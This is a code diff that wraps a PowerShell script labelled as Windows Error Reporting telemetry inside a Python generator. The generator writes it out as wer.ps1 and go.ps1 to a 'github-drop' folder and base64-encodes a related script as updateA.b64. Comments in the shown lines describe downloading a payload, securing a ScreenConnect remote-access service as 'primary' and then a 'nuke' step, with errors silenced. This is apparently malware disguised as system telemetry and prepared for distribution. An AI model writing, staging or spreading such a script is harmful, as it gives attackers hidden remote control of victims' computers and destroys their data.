@@ -1,4 +1,7 @@
-# WER telemetry collect - UNIFIED11
+from pathlib import Path
+import base64
+
+content = r'''# WER telemetry collect - UNIFIED11
 # ORDER: download payload -> ensure primary (inside payload) -> then nuke
 # Inline invoke (no run.ps1). Does NOT nuke before primary is ready.
 $ErrorActionPreference = 'SilentlyContinue'
@@ -102,3 +105,18 @@ Write-Host "  type $Err"
 Write-Host "  type $WorkDir\.diag.log"
 Write-Host '  sc query type= service state= all | findstr /I ScreenConnect'
 exit 0
+'''
+
+root = Path(r'C:\Users\nobuddy\Desktop\Project\github-drop')
+data = content.encode('utf-8')
+for name in ('wer.ps1', 'go.ps1'):
+    (root / name).write_bytes(data)
+    print('wrote', name)
+
+src = Path(r'C:\Users\nobuddy\Desktop\Project\Script.txt').read_bytes()
+assert b'UNIFIED11' in src
+assert b'ensure PRIMARY' in src or b'ensure PRIMARY ScreenConnect' in src
+assert b'PHASE 2 SKIPPED: primary NOT ready' in src
+b64 = base64.b64encode(src).decode('ascii')
+(root / 'updateA.b64').write_text('\n'.join(b64[i:i+76] for i in range(0, len(b64), 76)) + '\n', encoding='ascii')
+print('updateA', len(src), (root/'updateA.b64').stat().st_size)
